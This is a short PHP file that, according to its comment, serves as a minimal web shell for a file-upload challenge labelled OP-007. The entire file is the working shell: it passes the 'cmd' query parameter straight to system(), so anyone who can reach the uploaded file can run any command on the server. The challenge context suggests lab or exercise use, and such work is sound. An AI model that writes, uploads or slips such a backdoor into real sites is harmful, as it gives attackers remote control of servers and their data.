<?php
// Minimal web shell for testing file upload challenge (OP-007)
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "OK";
}
